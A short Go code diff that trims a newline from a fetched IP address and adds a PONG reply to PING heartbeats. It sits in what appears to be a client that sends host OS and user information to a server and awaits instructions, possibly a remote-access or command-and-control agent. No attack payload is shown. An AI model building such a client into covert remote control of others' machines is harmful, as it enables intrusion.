@@ -10,6 +10,7 @@ import (
 	"os"
 	"os/user"
 	"runtime"
+	"strings"
 )
 
 type Client struct {
@@ -73,7 +74,8 @@ func getIP() (string, error) {
 	if err != nil {
 		return "", nil
 	}
-	return string(resbody), nil
+	ip := strings.TrimRight(string(resbody), "\n")
+	return ip, nil
 }
 
 func sendOSInfo(conn net.Conn) error {
@@ -121,7 +123,11 @@ func awaitInstructions(conn net.Conn) error {
 	if err != nil {
 		return err
 	}
-	if inst.IsHeartbeat == true {
+	if inst.IsHeartbeat == true && inst.Message == "PING" {
+		resp := Response{
+			Message: "PONG",
+		}
+		sendMessage(resp, conn)
 		return nil
 	}
 	return nil
